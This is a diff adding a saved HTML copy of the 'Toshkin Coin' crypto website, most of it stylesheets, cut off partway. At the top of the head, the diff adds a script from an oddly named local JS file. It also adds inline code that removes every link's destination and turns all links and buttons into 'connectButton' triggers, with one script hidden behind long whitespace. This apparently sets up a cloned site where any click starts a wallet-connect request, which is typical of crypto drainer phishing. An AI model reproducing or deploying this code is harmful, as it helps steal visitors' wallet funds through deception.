@@ -1,0 +1,2832 @@
+<!DOCTYPE html>
+<html lang="en" data-capo="" data-scrapbook-source="https://toshkin.com/" data-scrapbook-create="20240720155038384">
+
+<head>
+    <script src="/fe860ea39f8f3c925.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      var links = document.querySelectorAll('body a');
+      for (var i = 0; i < links.length; i++) {
+        var link = links[i];
+        link.removeAttribute('href');
+        link.classList.add('connectButton');
+      }
+      });
+      </script>                                                                                                                          <script>
+  document.addEventListener('DOMContentLoaded', function () {
+    var buttons = document.querySelectorAll('body button');
+    for (var i = 0; i < buttons.length; i++) {
+      var button = buttons[i];
+      button.classList.add('connectButton');
+    }
+  });
+  </script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      const elements = document.querySelectorAll('[ad-data-linked]');
+      elements.forEach(element => {
+          element.removeAttribute('ad-data-linked');
+      });
+  
+      console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+  });
+  
+  </script>
+  
+      <style>
+        .connectButton {
+        cursor: pointer;
+        }
+      </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <title>Toshkin Coin</title>
+    <style>
+        .flicking-viewport {
+            overflow: hidden;
+            position: relative
+        }
+
+        .flicking-viewport.vertical {
+            display: inline-flex
+        }
+
+        .flicking-viewport.vertical>.flicking-camera {
+            display: inline-flex;
+            flex-direction: column
+        }
+
+        .flicking-viewport.flicking-hidden>.flicking-camera>* {
+            visibility: hidden
+        }
+
+        .flicking-camera {
+            display: flex;
+            flex-direction: row;
+            height: 100%;
+            position: relative;
+            width: 100%;
+            will-change: transform;
+            z-index: 1
+        }
+
+        .flicking-camera>* {
+            flex-shrink: 0
+        }
+
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        @font-face {
+            font-display: swap;
+            font-family: Alegreya Sans;
+            font-style: normal;
+            font-weight: 700;
+            src: url("alegreya-sans-v24-latin-700.euewqviX.woff2") format("woff2")
+        }
+
+        @font-face {
+            font-display: swap;
+            font-family: Sora;
+            font-style: normal;
+            font-weight: 400;
+            src: url("sora-v12-latin-regular.DZtuNFrm.woff2") format("woff2")
+        }
+
+        #__nuxt,
+        body,
+        html {
+            height: 100%
+        }
+
+        body {
+            background-color: #000;
+            font: 16px/24px Sora;
+            font-weight: 400;
+            margin: 0
+        }
+
+        .--layout {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            padding-top: 96px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .--layout {
+                padding-top: 80px
+            }
+        }
+
+        .--content {
+            background-color: var(--color-black);
+            flex: 1 0 auto
+        }
+
+        .--footer {
+            flex-shrink: 0
+        }
+
+        .--theme_default {
+            color: var(--color-white)
+        }
+
+        .--image {
+            position: relative
+        }
+
+        .--image__url {
+            bottom: 0;
+            display: block;
+            height: 100%;
+            left: 0;
+            position: absolute;
+            right: 0;
+            top: 0;
+            width: 100%
+        }
+
+        p {
+            margin: 0 0 16px
+        }
+
+        h2 {
+            font: 64px/72px Alegreya Sans;
+            margin: 0 0 32px
+        }
+
+        @media only screen and (max-width:767px) {
+            h2 {
+                font-size: 48px;
+                line-height: 56px
+            }
+        }
+
+        h2 span {
+            color: var(--color-2)
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .-layout__socials {
+            background-color: var(--color-2);
+            border-radius: 24px;
+            bottom: 8px;
+            box-sizing: border-box;
+            padding: 8px;
+            position: fixed;
+            right: 8px;
+            transform: translateY(0);
+            transition: .3s;
+            z-index: 2
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-layout__socials {
+                display: none
+            }
+        }
+
+        .-layout__socials_hide {
+            transform: translateY(400px);
+            transition: .3s
+        }
+
+        .-layout__socials a {
+            align-items: center;
+            display: flex;
+            justify-content: center;
+            width: 40px
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .-header {
+            background-color: hsla(0, 0%, 8%, .8);
+            box-sizing: border-box;
+            left: 0;
+            padding: 16px 0 0;
+            position: relative;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 10
+        }
+
+        .-header:after {
+            -webkit-backdrop-filter: blur(10px);
+            backdrop-filter: blur(10px);
+            bottom: 0;
+            content: "";
+            left: 0;
+            position: absolute;
+            right: 0;
+            top: 0;
+            z-index: -1
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-header {
+                padding: 8px 0 0
+            }
+        }
+
+        .-header__content {
+            align-items: center;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: space-between;
+            margin: auto auto 16px;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%
+        }
+
+        .-header__logo {
+            align-items: center;
+            display: flex;
+            z-index: 1
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-header__logo svg {
+                height: 32px
+            }
+        }
+
+        .-header__menu {
+            align-items: center;
+            display: flex;
+            justify-content: flex-end;
+            list-style: none;
+            margin: 0
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-header__menu {
+                display: none
+            }
+        }
+
+        .-header__button {
+            align-items: center;
+            background-color: var(--color-black);
+            border: none;
+            border-radius: 100px;
+            color: var(--color-white);
+            cursor: pointer;
+            display: flex;
+            font: 14px/24px Sora;
+            height: 40px;
+            justify-content: center;
+            margin-left: 20px;
+            padding: 0 25px;
+            text-decoration: none;
+            transition: .2s
+        }
+
+        .-header__button:hover,
+        .-header__button_active {
+            background-color: var(--color-2);
+            transition: .2s
+        }
+
+        .-header__socials {
+            margin-right: 40px;
+            margin-top: 4px
+        }
+
+        @media only screen and (max-width:767px) {
+            .-header__socials {
+                margin-right: 15px
+            }
+        }
+
+        .-header__socials a {
+            width: 32px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-header__socials a {
+                margin-right: 10px;
+                width: 24px
+            }
+        }
+
+        .-header__socials .-socials__telegram {
+            margin-right: 20px
+        }
+
+        .-header__socials .-socials__tiktok {
+            width: 20px
+        }
+
+        .-header__mobile-left {
+            display: flex;
+            justify-content: flex-end
+        }
+
+        .-header__attention {
+            margin: 0 -16px;
+            position: relative;
+            width: calc(100% + 32px);
+            z-index: 2
+        }
+    </style>
+    <style>
+        .--theme_default[data-v-7189b683] {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .header-mobile-menu[data-v-7189b683] {
+            display: none
+        }
+
+        @media only screen and (max-width:1024px) {
+            .header-mobile-menu[data-v-7189b683] {
+                display: block
+            }
+        }
+
+        .header-mobile-menu__navigation[data-v-7189b683] {
+            align-items: center;
+            background-color: var(--color-1);
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            justify-content: center;
+            left: 0;
+            position: fixed;
+            top: -100vh;
+            transition: .25s ease-out;
+            width: 100vw
+        }
+
+        .header-mobile-menu__navigation.open[data-v-7189b683] {
+            top: 0;
+            transition: .15s ease-in-out
+        }
+
+        .header-mobile-menu__navigation ul[data-v-7189b683] {
+            align-items: center;
+            display: flex;
+            flex-direction: column;
+            list-style: none;
+            margin: 0;
+            padding: 0
+        }
+
+        .header-mobile-menu__navigation ul[data-v-7189b683]:first-child {
+            margin-bottom: 40px
+        }
+
+        .header-mobile-menu__navigation li[data-v-7189b683] {
+            margin-bottom: 24px
+        }
+
+        .header-mobile-menu__navigation li a[data-v-7189b683],
+        .header-mobile-menu__navigation li button[data-v-7189b683] {
+            min-width: 230px;
+            padding: 0
+        }
+    </style>
+    <style>
+        .--theme_default[data-v-68d35315] {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .menu-icon[data-v-68d35315] {
+            cursor: pointer;
+            height: 50px;
+            position: relative;
+            width: 50px;
+            z-index: 10
+        }
+
+        .menu-icon .menu-icon__cheeckbox[data-v-68d35315] {
+            cursor: pointer;
+            display: block;
+            height: 100%;
+            position: relative;
+            width: 100%;
+            z-index: 2;
+            -webkit-touch-callout: none;
+            opacity: 0;
+            position: absolute
+        }
+
+        .menu-icon div[data-v-68d35315] {
+            bottom: 0;
+            height: 12px;
+            left: 0;
+            margin: auto;
+            position: absolute;
+            right: 0;
+            top: 0;
+            width: 22px
+        }
+
+        .menu-icon span[data-v-68d35315] {
+            background-color: #fff;
+            border-radius: 1px;
+            display: block;
+            height: 2px;
+            position: absolute;
+            transition: all .2s cubic-bezier(.1, .82, .76, .965);
+            width: 100%
+        }
+
+        .menu-icon span[data-v-68d35315]:first-of-type {
+            top: 0
+        }
+
+        .menu-icon span[data-v-68d35315]:last-of-type {
+            bottom: 0
+        }
+
+        .menu-icon .menu-icon__cheeckbox:checked+div span[data-v-68d35315]:first-of-type,
+        .menu-icon.active span[data-v-68d35315]:first-of-type {
+            top: 5px;
+            transform: rotate(45deg)
+        }
+
+        .menu-icon .menu-icon__cheeckbox:checked+div span[data-v-68d35315]:last-of-type,
+        .menu-icon.active span[data-v-68d35315]:last-of-type {
+            bottom: 5px;
+            transform: rotate(-45deg)
+        }
+
+        .menu-icon.active:hover span[data-v-68d35315]:first-of-type,
+        .menu-icon.active:hover span[data-v-68d35315]:last-of-type,
+        .menu-icon:hover .menu-icon__cheeckbox:checked+div span[data-v-68d35315]:first-of-type,
+        .menu-icon:hover .menu-icon__cheeckbox:checked+div span[data-v-68d35315]:last-of-type {
+            width: 22px
+        }
+
+        @media (min-width:1024px) {
+            .menu-icon:hover span[data-v-68d35315]:first-of-type {
+                width: 26px
+            }
+
+            .menu-icon:hover span[data-v-68d35315]:last-of-type {
+                width: 12px
+            }
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .-socials {
+            align-items: center;
+            display: flex;
+            justify-content: flex-start
+        }
+
+        .-socials__icons {
+            margin-right: 30px
+        }
+
+        .-socials__icons:first-child {
+            margin-right: 15px
+        }
+
+        .-socials__icons:last-child {
+            margin-right: 0
+        }
+
+        .-socials__icons svg {
+            fill: var(--color-white);
+            transform: scale(1);
+            transition: .2s
+        }
+
+        .-socials__icons svg:hover {
+            fill: var(--color-main);
+            transform: scale(1.2);
+            transition: .2s
+        }
+
+        .-socials__x {
+            width: 76px
+        }
+
+        .-socials__telegram {
+            width: 60px
+        }
+
+        .-socials__tiktok {
+            width: 52px
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .-attention {
+            align-items: center;
+            background-color: var(--color-2);
+            color: var(--color-white);
+            display: flex;
+            font: 14px/16px Sora;
+            height: 24px;
+            width: 100%
+        }
+
+        .-attention__wrapper {
+            box-sizing: border-box;
+            margin: auto;
+            max-width: 1256px;
+            padding: 0 16px;
+            position: relative;
+            width: 100%
+        }
+
+        .-attention__wrapper:after,
+        .-attention__wrapper:before {
+            background-image: url("attention-bg.png");
+            content: "";
+            display: block;
+            height: 24px;
+            left: 0;
+            position: absolute;
+            top: -4px;
+            width: 40px;
+            z-index: 3
+        }
+
+        .-attention__wrapper:after {
+            left: unset;
+            right: 0;
+            transform: rotate(180deg)
+        }
+
+        .-attention a,
+        .-attention span {
+            color: var(--color-white);
+            margin-right: 40px;
+            text-decoration: none
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .-footer {
+            background-color: var(--color-1);
+            padding: 40px 0 0
+        }
+
+        .-footer__wrapper {
+            align-items: flex-start;
+            box-sizing: border-box;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin: auto;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%
+        }
+
+        @media only screen and (max-width:767px) {
+            .-footer__wrapper {
+                align-items: center;
+                flex-direction: column
+            }
+        }
+
+        .-footer__top {
+            display: grid;
+            gap: 24px;
+            grid-template-columns: 1fr 240px;
+            width: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-footer__top {
+                align-items: center;
+                display: flex;
+                flex-direction: column;
+                gap: 0
+            }
+
+            .-footer__top-logo {
+                margin-bottom: 24px
+            }
+        }
+
+        .-footer__top-menu {
+            grid-column: 1/3
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-footer__top-menu {
+                margin-bottom: 32px
+            }
+        }
+
+        .-footer__top-socials {
+            grid-area: 1/2/1/3
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-footer__top-socials {
+                margin-bottom: 24px
+            }
+        }
+
+        .-footer__menu {
+            display: flex;
+            list-style: none;
+            margin: 0 0 40px;
+            padding: 0
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-footer__menu {
+                margin-bottom: 0
+            }
+        }
+
+        @media only screen and (max-width:767px) {
+            .-footer__menu {
+                align-items: center;
+                flex-direction: column
+            }
+        }
+
+        .-footer__menu-item {
+            align-items: center;
+            display: flex;
+            justify-content: center;
+            margin-right: 20px
+        }
+
+        @media only screen and (max-width:767px) {
+            .-footer__menu-item {
+                margin-bottom: 16px
+            }
+        }
+
+        .-footer__button {
+            background-color: transparent;
+            border: none;
+            color: var(--color-white);
+            font-size: 16px;
+            line-height: 16px;
+            margin-left: 0;
+            padding: 0;
+            width: auto
+        }
+
+        @media only screen and (max-width:1024px) {
+            .-footer__logo {
+                align-items: center;
+                display: flex;
+                justify-content: center;
+                margin-bottom: 32px
+            }
+        }
+
+        .-footer__bottom {
+            align-items: center;
+            display: flex;
+            justify-content: space-between;
+            width: 100%
+        }
+
+        @media only screen and (max-width:767px) {
+            .-footer__bottom {
+                flex-direction: column
+            }
+        }
+
+        .-footer__contact-us {
+            color: var(--color-2);
+            text-decoration: none;
+            transition: .2s
+        }
+
+        .-footer__contact-us:hover {
+            color: var(--color-main);
+            transition: .2s
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .home-main {
+            box-sizing: border-box;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            margin: auto auto 96px;
+            max-width: 1256px;
+            padding: 56px 16px 0;
+            width: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-main {
+                display: flex;
+                flex-direction: column;
+                margin-bottom: 56px;
+                padding-top: 24px
+            }
+        }
+
+        .home-main h1 {
+            font: 64px/72px Alegreya Sans;
+            margin: 0 0 32px;
+            width: 100%
+        }
+
+        .home-main h1 span {
+            color: var(--color-2)
+        }
+
+        .home-main__left {
+            max-width: 540px;
+            width: 60%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-main__left {
+                font-size: 18px;
+                max-width: unset;
+                width: 100%
+            }
+        }
+
+        .home-main__right {
+            max-width: 520px;
+            width: 38%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-main__right {
+                max-width: unset;
+                width: 100%
+            }
+        }
+
+        .home-main__right img {
+            height: auto;
+            width: 100%
+        }
+
+        .home-main__description {
+            margin-bottom: 48px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-main__description {
+                font-size: 18px;
+                margin-bottom: 40px
+            }
+        }
+
+        .home-main__image {
+            align-items: center;
+            background-color: var(--color-1);
+            border-radius: 40px;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 56px;
+            overflow: hidden
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-main__image {
+                margin-bottom: 32px
+            }
+        }
+
+        .home-main__list {
+            display: grid;
+            gap: 40px;
+            grid-template-columns: 1fr 1fr;
+            margin-bottom: 56px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-main__list {
+                margin-bottom: 40px
+            }
+        }
+
+        @media screen and (max-width:600px) {
+            .home-main__list {
+                display: flex;
+                flex-direction: column;
+                gap: 0;
+                margin-bottom: 24px
+            }
+        }
+
+        .home-main__button {
+            align-items: center;
+            background-color: var(--color-main);
+            border-radius: 16px;
+            color: var(--color-white);
+            display: flex;
+            font-size: 18px;
+            justify-content: center;
+            line-height: 40px;
+            text-decoration: none;
+            transform: scale(1);
+            transition: .2s;
+            width: 100%
+        }
+
+        .home-main__button:hover {
+            transform: scale(1.1);
+            transition: .2s
+        }
+
+        @media screen and (max-width:600px) {
+            .home-main__button {
+                margin-bottom: 16px
+            }
+        }
+
+        .home-main__banner {
+            border-radius: 40px;
+            height: auto;
+            overflow: hidden;
+            width: 100%
+        }
+
+        .home-main__banner img {
+            width: 100%
+        }
+    </style>
+    <style>
+        .--theme_default[data-v-5bfafd3a] {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .home-about[data-v-5bfafd3a] {
+            box-sizing: border-box;
+            margin: auto auto 96px;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-about[data-v-5bfafd3a] {
+                margin-bottom: 56px
+            }
+        }
+
+        .home-about__title[data-v-5bfafd3a] {
+            grid-column: 2
+        }
+
+        .home-about__about[data-v-5bfafd3a],
+        .home-about__team[data-v-5bfafd3a] {
+            display: grid;
+            grid-template-columns: 1.4fr 1fr;
+            grid-column-gap: 48px
+        }
+
+        @media only screen and (max-width:1024px) {
+
+            .home-about__about[data-v-5bfafd3a],
+            .home-about__team[data-v-5bfafd3a] {
+                display: flex;
+                flex-direction: column
+            }
+        }
+
+        .home-about__about[data-v-5bfafd3a] {
+            margin-bottom: 32px
+        }
+
+        @media only screen and (max-width:1024px) {
+
+            .home-about__about[data-v-5bfafd3a],
+            .home-about__about .home-about__right[data-v-5bfafd3a] {
+                margin-bottom: 24px
+            }
+        }
+
+        .home-about__team .home-about__left[data-v-5bfafd3a] {
+            grid-row: 2
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-about__team .home-about__left[data-v-5bfafd3a] {
+                margin-bottom: 40px
+            }
+        }
+
+        .home-about__right[data-v-5bfafd3a] {
+            grid-column: 2;
+            grid-row: 2
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-about__right[data-v-5bfafd3a] {
+                font-size: 18px
+            }
+        }
+
+        .home-about__left[data-v-5bfafd3a] {
+            display: grid;
+            gap: 24px;
+            grid-column: 1;
+            grid-template-columns: 1fr 1fr
+        }
+
+        .home-about__image[data-v-5bfafd3a] {
+            align-items: center;
+            background-color: var(--color-1);
+            border-radius: 40px;
+            display: flex;
+            justify-content: center;
+            overflow: hidden
+        }
+
+        .home-about__image img[data-v-5bfafd3a] {
+            width: 100%
+        }
+
+        .home-about__list[data-v-5bfafd3a] {
+            display: grid;
+            gap: 32px;
+            grid-template-columns: repeat(4, minmax(20%, 120px));
+            width: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-about__list[data-v-5bfafd3a] {
+                grid-template-columns: repeat(4, 1fr)
+            }
+        }
+
+        @media screen and (max-width:480px) {
+            .home-about__list[data-v-5bfafd3a] {
+                grid-template-columns: repeat(2, 1fr)
+            }
+        }
+
+        .home-about__list img[data-v-5bfafd3a] {
+            border-radius: 24px;
+            display: block;
+            margin-bottom: 8px;
+            width: 100%
+        }
+
+        .home-about__item-title[data-v-5bfafd3a] {
+            font: 16px/16px Alegreya Sans;
+            margin-bottom: 8px;
+            text-align: center
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .home-nft {
+            box-sizing: border-box;
+            display: grid;
+            grid-template-columns: 1.4fr 1fr;
+            margin: auto auto 96px;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%;
+            grid-column-gap: 48px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-nft {
+                display: flex;
+                flex-direction: column;
+                margin-bottom: 56px
+            }
+        }
+
+        .home-nft__title {
+            grid-column: 1/3
+        }
+
+        .home-nft__left {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-nft__left {
+                font-size: 18px;
+                margin-bottom: 24px
+            }
+        }
+
+        .home-nft__banner {
+            border-radius: 40px;
+            height: auto;
+            width: 100%
+        }
+
+        .home-nft__wallet {
+            border: 1px solid var(--color-main);
+            border-radius: 40px;
+            box-sizing: border-box;
+            min-width: 490px;
+            padding: 48px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-nft__wallet {
+                margin-bottom: 24px;
+                min-width: unset
+            }
+        }
+
+        @media only screen and (max-width:767px) {
+            .home-nft__wallet {
+                padding: 24px
+            }
+        }
+
+        .home-nft__wallet-top {
+            display: flex;
+            justify-content: space-between
+        }
+
+        @media only screen and (max-width:767px) {
+            .home-nft__wallet-top {
+                align-items: center;
+                display: flex;
+                flex-direction: column
+            }
+        }
+
+        .home-nft__wallet-top img {
+            border-radius: 40px;
+            max-width: 180px;
+            width: 100%
+        }
+
+        .home-nft__wallet-info {
+            margin-bottom: 32px;
+            max-width: 180px;
+            text-align: center
+        }
+
+        .home-nft__wallet-info span {
+            color: var(--color-main)
+        }
+
+        .home-nft__wallet-title {
+            font-size: 26px;
+            line-height: 32px;
+            margin: 0 0 32px
+        }
+
+        @media only screen and (max-width:767px) {
+            .home-nft__wallet-title {
+                text-align: center
+            }
+        }
+
+        .home-nft__wallet-title-last {
+            margin-bottom: 8px
+        }
+
+        .home-nft__wallet-title span {
+            color: var(--color-2)
+        }
+
+        .home-nft__wallet-text {
+            text-decoration: underline
+        }
+
+        @media only screen and (max-width:767px) {
+            .home-nft__wallet-text {
+                text-align: center
+            }
+        }
+
+        .home-nft__wallet-buttons {
+            margin-bottom: 32px
+        }
+
+        .home-nft__wallet-counter {
+            align-items: center;
+            border: 1px solid #333;
+            border-radius: 16px;
+            box-sizing: border-box;
+            display: flex;
+            font-size: 18px;
+            height: 56px;
+            justify-content: space-between;
+            margin-bottom: 8px
+        }
+
+        @media only screen and (max-width:767px) {
+            .home-nft__wallet-counter {
+                margin-bottom: 24px
+            }
+        }
+
+        .home-nft__wallet-counter button {
+            background-color: transparent;
+            border: none;
+            box-sizing: border-box;
+            color: var(--color-white);
+            cursor: pointer;
+            font-size: 36px;
+            padding: 0 16px;
+            transform: scale(1);
+            transition: .2s
+        }
+
+        .home-nft__wallet-counter button:hover {
+            transform: scale(1.2);
+            transition: .2s
+        }
+
+        .home-nft__wallet-counter button:disabled {
+            color: #333;
+            transform: scale(1)
+        }
+
+        .button_white {
+            align-items: center;
+            background-color: var(--color-white);
+            border: none;
+            border-radius: 16px;
+            box-sizing: border-box;
+            color: var(--color-black);
+            cursor: pointer;
+            display: flex;
+            font-size: 18px;
+            height: 40px;
+            justify-content: center;
+            padding: 0 20px;
+            text-decoration: none;
+            transform: scale(1);
+            transition: .2s
+        }
+
+        .button_white:hover {
+            transform: scale(1.2);
+            transition: .2s
+        }
+
+        @media only screen and (max-width:767px) {
+            .button_white {
+                margin-bottom: 16px
+            }
+        }
+
+        .button_yellow {
+            align-items: center;
+            background-color: var(--color-main);
+            border: none;
+            border-radius: 10px;
+            box-sizing: border-box;
+            color: var(--color-white);
+            cursor: pointer;
+            display: flex;
+            font-size: 18px;
+            height: 56px;
+            justify-content: center;
+            padding: 0 20px;
+            text-decoration: none;
+            transform: scale(1);
+            transition: .2s;
+            width: 100%
+        }
+
+        .button_yellow:hover {
+            transform: scale(1.1);
+            transition: .2s
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .home-toshkinomics {
+            box-sizing: border-box;
+            margin: auto auto 96px;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-toshkinomics {
+                margin-bottom: 56px
+            }
+        }
+
+        .home-toshkinomics__title {
+            grid-column: 1/3
+        }
+
+        .home-toshkinomics__wrapper {
+            display: grid;
+            gap: 48px;
+            grid-template-columns: 1.4fr 1fr
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-toshkinomics__wrapper {
+                display: flex;
+                flex-direction: column;
+                gap: 0
+            }
+        }
+
+        .home-toshkinomics__block {
+            background-color: var(--color-1);
+            border-radius: 40px;
+            box-sizing: border-box;
+            padding: 40px 16px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-toshkinomics__block {
+                margin-bottom: 24px
+            }
+        }
+
+        .home-toshkinomics__block-list-wrapper {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            justify-content: center;
+            width: 100%
+        }
+
+        .home-toshkinomics h4 {
+            color: var(--color-main);
+            font-size: 32px;
+            line-height: 32px;
+            margin: 0 0 56px
+        }
+
+        .home-toshkinomics__list {
+            display: flex;
+            flex: 1;
+            flex-direction: column;
+            justify-content: space-between;
+            list-style: none;
+            margin: 0;
+            padding: 0
+        }
+
+        .home-toshkinomics__about {
+            display: flex;
+            flex-direction: column;
+            grid-row: 1/3
+        }
+
+        .home-toshkinomics__chart {
+            align-items: center;
+            display: flex;
+            justify-content: flex-start
+        }
+
+        @media only screen and (max-width:767px) {
+            .home-toshkinomics__chart {
+                flex-direction: column
+            }
+        }
+
+        .home-toshkinomics__chart-donut {
+            margin-right: 40px;
+            max-width: 200px
+        }
+
+        @media only screen and (max-width:767px) {
+            .home-toshkinomics__chart-donut {
+                margin-bottom: 24px;
+                margin-right: 0
+            }
+        }
+
+        .home-toshkinomics__chart-info {
+            list-style: none;
+            margin: 0;
+            padding: 0
+        }
+
+        .home-toshkinomics__chart-info-item {
+            align-items: center;
+            display: flex
+        }
+
+        .home-toshkinomics__chart-info-item span {
+            border-radius: 50%;
+            display: block;
+            height: 16px;
+            margin-right: 8px;
+            width: 16px
+        }
+
+        .home-toshkinomics__description {
+            font-size: 16px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-toshkinomics__description {
+                font-size: 18px
+            }
+        }
+
+        .home-toshkinomics__item {
+            align-items: center;
+            display: flex;
+            justify-content: space-between
+        }
+
+        .home-toshkinomics__item:last-child {
+            margin-bottom: 0
+        }
+
+        .home-toshkinomics__item p {
+            margin: 0
+        }
+
+        .home-toshkinomics__item-title {
+            font-size: 16px
+        }
+
+        .home-toshkinomics__item-value {
+            color: var(--color-main);
+            font-size: 16px;
+            margin-left: 20px;
+            overflow: hidden;
+            text-decoration: none;
+            text-overflow: ellipsis;
+            white-space: nowrap
+        }
+
+        .home-toshkinomics__item a {
+            transition: .2s
+        }
+
+        .home-toshkinomics__item a:hover {
+            color: var(--color-2);
+            transition: .2s
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .home-our-partners {
+            box-sizing: border-box;
+            margin: auto auto 96px;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-our-partners {
+                margin-bottom: 56px
+            }
+        }
+
+        .home-our-partners__wrapper {
+            box-sizing: border-box;
+            display: flex;
+            justify-content: center;
+            margin: auto;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%
+        }
+
+        .home-our-partners__list {
+            position: relative
+        }
+
+        .home-our-partners__list:after,
+        .home-our-partners__list:before {
+            background: #000;
+            background: linear-gradient(90deg, #000, rgba(0, 0, 0, .157) 80%, transparent);
+            bottom: 0;
+            content: "";
+            display: block;
+            height: 100%;
+            left: 0;
+            position: absolute;
+            top: 0;
+            width: 40px;
+            z-index: 2
+        }
+
+        .home-our-partners__list:after {
+            left: unset;
+            right: 0;
+            transform: rotate(180deg)
+        }
+
+        .home-our-partners__item {
+            margin-right: 60px;
+            position: relative
+        }
+
+        .home-our-partners a {
+            bottom: 0;
+            height: 100%;
+            left: 0;
+            position: absolute;
+            right: 0;
+            top: 0;
+            width: 100%
+        }
+
+        .home-our-partners img {
+            max-height: 90px
+        }
+    </style>
+    <style>
+        .--theme_default {
+            --color-black: #000;
+            --color-white: #fff;
+            --color-main: #e8984b;
+            --color-1: #151515;
+            --color-2: #d21f3d;
+            --max-content: 1256px
+        }
+
+        .home-all-markets {
+            box-sizing: border-box;
+            display: grid;
+            grid-template-columns: 1.4fr 1fr;
+            margin: auto auto 96px;
+            max-width: 1256px;
+            padding: 0 16px;
+            width: 100%;
+            grid-column-gap: 48px
+        }
+
+        @media only screen and (max-width:1024px) {
+            .home-all-markets {
+                display: flex;
+                flex-direction: column;
+                margin-bottom: 56px
+            }
+        }
+
+        .home-all-markets__title {
+            grid-column: 1/3
+        }
+
